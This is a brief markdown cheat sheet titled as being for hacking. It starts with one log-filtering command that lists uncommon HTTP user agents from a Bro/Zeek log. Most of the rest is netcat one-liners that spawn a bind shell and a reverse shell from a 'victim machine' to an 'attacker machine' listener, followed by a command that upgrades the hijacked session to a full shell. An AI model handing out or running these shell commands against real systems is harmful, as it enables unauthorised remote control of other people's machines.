# cheatsheet for hacking

### uncommon http user agents

cat http.log | bro-cut user_agent | sort | uniq | grep -vi -e ^mozilla -e ^opera -e ^microsoft > uncommon_user_agents.txt

### reverse shell to a local port

start shell on a port

    nc -l -p 1234 -e /bin/bash

get access to that reverse shell from another server

    nc -vvn 192.168.10.11 1234

### reverse shell to a remote server port

attacker machine

    nc -lvp 443

victim machine

    nc -nv 192.168.10.10 443 -e /bin/bash

start command prompt (get a full shell) in a reverse hacked shell

    script -qc /bin/bash /dev/null
